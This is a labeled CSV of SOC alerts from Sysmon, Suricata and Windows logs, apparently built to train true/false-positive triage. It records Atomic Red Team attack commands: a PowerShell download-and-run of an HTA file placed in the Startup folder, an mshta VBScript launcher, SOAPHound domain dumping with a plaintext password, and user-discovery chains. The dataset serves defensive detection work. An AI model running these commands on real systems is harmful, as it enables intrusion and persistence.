text,label,label_name
Suricata: Alert - GPL ATTACK_RESPONSE id check returned root 3 Low Suricata: Alert - GPL ATTACK_RESPONSE id check returned root 86601 ids suricata json Suricata /var/log/suricata/eve.json,0,FP
"Powershell process spawned powershell instance 4 Low Powershell process spawned powershell instance 92027 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""powershell.exe\"" &amp; {$var =Invoke-WebRequest \\\""\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\\\""\"" $var.content|out-file \\\""\""$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\\\""\"" mshta \\\""\""$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\\\""\"" start-sleep -s 15 stop-process -name \\\""\""calculator\\\""\"" -Force -ErrorAction Ignore stop-process -name \\\""\""CalculatorApp\\\""\"" -Force -ErrorAction Ignore} \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2025-07-04 21:33:08.543
ProcessGuid: {ff3427f9-4894-6868-1605-000000001400}
ProcessId: 3504
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force -ErrorAction Ignore
stop-process -name \""""CalculatorApp\"""" -Force -ErrorAction Ignore}
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Powershell process spawned powershell instance 4 Low Powershell process spawned powershell instance 92027 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""powershell.exe\"" &amp; {[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt} \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2025-07-05 13:03:06.713
ProcessGuid: {ff3427f9-228a-6869-aa01-000000001500}
ProcessId: 2360
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt}
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-20c8-6869-f800-000000001500}
ParentProcessId: 2440
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
Suricata: Alert - SURICATA Applayer Detect protocol only one direction 3 Low Suricata: Alert - SURICATA Applayer Detect protocol only one direction 86601 ids suricata json Suricata /var/log/suricata/eve.json,1,TP
"Scripting file created under Windows Temp or User folder 6 Low Scripting file created under Windows Temp or User folder 92200 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\fsquirt.exe C:\\Users\\sbeater\\AppData\\Roaming\\Microsoft\\Windows\\SendTo\\Bluetooth File Transfer.LNK SOCLAB\\sbeater ""File created:
RuleName: technique_id=T1187,technique_name=Forced Authentication
UtcTime: 2025-07-04 09:34:18.588
ProcessGuid: {ff3427f9-a019-6867-c505-000000001200}
ProcessId: 11164
Image: C:\Windows\System32\fsquirt.exe
TargetFilename: C:\Users\sbeater\AppData\Roaming\Microsoft\Windows\SendTo\Bluetooth File Transfer.LNK
CreationUtcTime: 2025-07-04 09:34:18.586
User: SOCLAB\sbeater"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Discovery activity executed 3 Low Discovery activity executed 92031 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\net1 accounts net.exe accounts C:\\Windows\\SysWOW64\\net1.exe C:\\Windows\\SysWOW64\\net.exe NT AUTHORITY\\SYSTEM ""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2025-07-03 08:08:24.541
ProcessGuid: {ff3427f9-3a78-6866-9500-000000001200}
ProcessId: 4288
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.26100.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\WINDOWS\system32\net1 accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {ff3427f9-3a61-6866-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=669EE7F92EA3872FE2A36DF91ABF0E049B829279,MD5=F8D42E2BF18D54816819EA4DB4480F5F,SHA256=647136C32E9E7639B251719CFE503F1BD482335AECEC7AE7CB8A91B0A9805D49,IMPHASH=FEB4A1A72B6368863C8CC53955256BF8
ParentProcessGuid: {ff3427f9-3a78-6866-9300-000000001200}
ParentProcessId: 3368
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net.exe accounts
ParentUser: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Powershell.exe spawned a powershell process which executed a base64 encoded command 12 High Powershell.exe spawned a powershell process which executed a base64 encoded command 92057 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -EncodedCommand QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAKAAoAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAKAHsACgAgACAAJABQAG8AcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAEMAdQByAHMAbwByAF0AOgA6AFAAbwBzAGkAdABpAG8AbgAKACAAIAAkAHgAIAA9ACAAKAAkAHAAbwBzAC4AWAAgACUAIAA1ADAAMAApACAAKwAgADEACgAgACAAJAB5ACAAPQAgACgAJABwAG8AcwAuAFkAIAAlACAANQAwADAAKQAgACsAIAAxAAoAIAAgAFsAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4AQwB1AHIAcwBvAHIAXQA6ADoAUABvAHMAaQB0AGkAbwBuACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBQAG8AaQBuAHQAKAAkAHgALAAgACQAeQApAAoAIAAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADEAMAAKAH0A -noExit \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2025-07-02 18:44:07.734
ProcessGuid: {ff3427f9-7df7-6865-4003-000000001100}
ProcessId: 5416
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAKAAoAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAKAHsACgAgACAAJABQAG8AcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAEMAdQByAHMAbwByAF0AOgA6AFAAbwBzAGkAdABpAG8AbgAKACAAIAAkAHgAIAA9ACAAKAAkAHAAbwBzAC4AWAAgACUAIAA1ADAAMAApACAAKwAgADEACgAgACAAJAB5ACAAPQAgACgAJABwAG8AcwAuAFkAIAAlACAANQAwADAAKQAgACsAIAAxAAoAIAAgAFsAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4AQwB1AHIAcwBvAHIAXQA6ADoAUABvAHMAaQB0AGkAbwBuACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBQAG8AaQBuAHQAKAAkAHgALAAgACQAeQApAAoAIAAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADEAMAAKAH0A -noExit
CurrentDirectory: C:\Users\snell\Downloads\
User: SOCLAB\snell
LogonGuid: {ff3427f9-7463-6865-286f-720000000000}
LogonId: 0x726F28
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-796b-6865-2403-000000001100}
ParentProcessId: 1084
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Multiple Windows Logon Failures 10 Medium Multiple Windows Logon Failures 60204 windows windows_security authentication_failures windows_eventchannel Win11Client ""An account failed to log on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Type:			3

Account For Which Logon Failed:
	Security ID:		S-1-0-0
	Account Name:		top-usernames-shortlist.txt
	Account Domain:		-

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC0000064

Process Information:
	Caller Process ID:	0x0
	Caller Process Name:	-

Network Information:
	Workstation Name:	kali
	Source Network Address:	10.0.2.8
	Source Port:		0

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon request fails. It is generated on the computer where access was attempted.

The Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).

The Process Information fields indicate which account and process on the system requested the logon.

The Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The authentication information fields provide detailed information about this specific logon request.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."" AUDIT_FAILURE Microsoft-Windows-Security-Auditing Security EventChannel",1,TP
"Powershell process spawned powershell instance 4 Low Powershell process spawned powershell instance 92027 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""powershell.exe\"" &amp; {C:\\AtomicRedTeam\\atomics\\T1059.001\\bin\\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\\temp\\cache.txt --outputdirectory c:\\temp\\test2} \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2025-07-04 20:26:45.317
ProcessGuid: {ff3427f9-3905-6868-2503-000000001400}
ProcessId: 6692
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\temp\cache.txt --outputdirectory c:\temp\test2}
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
Suricata: Alert - ET INFO WinRM wsman Access - Possible Lateral Movement 3 Low Suricata: Alert - ET INFO WinRM wsman Access - Possible Lateral Movement 86601 ids suricata json Suricata /var/log/suricata/eve.json,0,FP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\snell\\AppData\\Local\\Temp\\Atomic-license.txt \""cmd.exe\"" /c C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\\Atomic-license.txt C:\\Windows\\System32\\bitsadmin.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1197,technique_name=BITS Jobs
UtcTime: 2025-07-04 21:44:30.831
ProcessGuid: {ff3427f9-4b3e-6868-ef05-000000001400}
ProcessId: 4488
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.26100.1150 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: C:\Windows\System32\bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\snell\AppData\Local\Temp\Atomic-license.txt
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=29EE300ACDAE46792A4E1BDD012D0C7FA1C5D13F,MD5=48E11CE37A4B73911D61CA9DB531E676,SHA256=2B090BB7151BF87FC6FA36E13F509B5059A68E694EEC2253F1AB74F9A7A0247B,IMPHASH=D93F8F73A9F8629D0A8B416A7FCEE86F
ParentProcessGuid: {ff3427f9-4b3e-6868-ed05-000000001400}
ParentProcessId: 68
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\Atomic-license.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Executable file dropped in folder commonly used by malware 15 Critical Executable file dropped in folder commonly used by malware 92213 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Users\\snell\\AppData\\Local\\Temp\\__PSScriptPolicyTest_jtbh0gak.d4x.ps1 SOCLAB\\snell ""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2025-06-29 12:04:39.425
ProcessGuid: {ff3427f9-2bcd-6861-9501-000000001000}
ProcessId: 8104
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\snell\AppData\Local\Temp\__PSScriptPolicyTest_jtbh0gak.d4x.ps1
CreationUtcTime: 2025-06-29 12:04:39.425
User: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"The database engine is starting a new instance. 3 Low The database engine is starting a new instance. 60805 windows windows_application windows_eventchannel Win11Client ""svchost (9272,P,98,0) DS_Token_DB: The database engine (10.00.26100.0000) is starting a new instance (0)."" INFORMATION ESENT Application EventChannel",0,FP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client quser  /SERVER:\""localhost\"" \""cmd.exe\"" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\""localhost\"" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \""tokens=1,2\"" %i in ('qwinsta /server:localhost ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \""tokens=1,2\"" %i in ('qwinsta /server:%n ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; usernames.txt C:\\Windows\\System32\\quser.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1033,technique_name=System Owner/User Discovery
UtcTime: 2025-07-05 13:02:57.390
ProcessGuid: {ff3427f9-2281-6869-9401-000000001500}
ProcessId: 2460
Image: C:\Windows\System32\quser.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: Query User Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: quser.exe
CommandLine: quser  /SERVER:""localhost"" 
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=CF02B7AF671E65DA963D6421458C3771B6914420,MD5=7BBF2B163FFB89A9E3F232FC8D61EAAB,SHA256=AEC93DC8483FDBFE2A537AB26FB4D07DC628BE2AA67C4E02381B086E7C830DEE,IMPHASH=B72F14292FAC033099AD1A08D6867486
ParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}
ParentProcessId: 9176
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:""localhost"" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F ""tokens=1,2"" %i in ('qwinsta /server:localhost ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client tasklist  /FI \""IMAGENAME eq Secure System\"" /v /FO list \""C:\\WINDOWS\\system32\\cmd.exe\"" /d /c C:\\WINDOWS\\system32\\hpatchmonTask.cmd C:\\Windows\\System32\\tasklist.exe C:\\Windows\\System32\\cmd.exe NT AUTHORITY\\SYSTEM ""Process Create:
RuleName: technique_id=T1057,technique_name=Process Discovery
UtcTime: 2025-06-29 12:12:42.049
ProcessGuid: {ff3427f9-2dba-6861-2c02-000000001000}
ProcessId: 10876
Image: C:\Windows\System32\tasklist.exe
FileVersion: 10.0.26100.1 (WinBuild.160101.0800)
Description: Lists the current running tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: tasklist.exe
CommandLine: tasklist  /FI ""IMAGENAME eq Secure System"" /v /FO list 
CurrentDirectory: C:\Windows\System32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {ff3427f9-2958-6861-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=6D343302F8C05633D486BC763D60ECB0FA8FB0B5,MD5=8ADD46C82B40A6F635F1406CF28DABA1,SHA256=62800679C55682F2F5F38B3DF9080D12480BEA78B5B8476EACE9DF014F353B14,IMPHASH=1EC449474B2F8125DB72AC9B593E4CA6
ParentProcessGuid: {ff3427f9-2daf-6861-2002-000000001000}
ParentProcessId: 4296
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\WINDOWS\system32\cmd.exe"" /d /c C:\WINDOWS\system32\hpatchmonTask.cmd
ParentUser: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Registry entry to be executed on next logon points to a remote access tool 12 High Registry entry to be executed on next logon points to a remote access tool 92303 sysmon sysmon_eid13_detections windows windows_eventchannel Win11Client C:\\Program Files\\TightVNC\\tvnserver.exe NT AUTHORITY\\SYSTEM ""Registry value set:
RuleName: technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder
EventType: SetValue
UtcTime: 2025-07-04 21:04:43.509
ProcessGuid: {ff3427f9-41eb-6868-5704-000000001400}
ProcessId: 10224
Image: C:\Program Files\TightVNC\tvnserver.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\tvncontrol
Details: ""C:\Program Files\TightVNC\tvnserver.exe"" -controlservice -slave
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client mshta  vbscript:Execute(\""CreateObject(\""\""Wscript.Shell\""\"").Run \""\""powershell -noexit -file C:\\AtomicRedTeam\\atomics\\T1218.005\\src\\powershell.ps1\""\"":close\"") \""cmd.exe\"" /c mshta vbscript:Execute(\""CreateObject(\""\""Wscript.Shell\""\"").Run \""\""powershell -noexit -file C:\\AtomicRedTeam\\atomics\\T1218.005\\src\\powershell.ps1\""\"":close\"") C:\\Windows\\System32\\mshta.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 21:33:06.450
ProcessGuid: {ff3427f9-4892-6868-1305-000000001400}
ProcessId: 10204
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.26100.2454 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: mshta  vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"""":close"")
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=F5B4B0D669D8B81A280218C4FAD60B22047FA047,MD5=CB5971A176EF0CFD5FC77792E2000558,SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E,IMPHASH=71A59821E6458156CA7792C7A1D58E33
ParentProcessGuid: {ff3427f9-4892-6868-1105-000000001400}
ParentProcessId: 4804
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"""":close"")
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
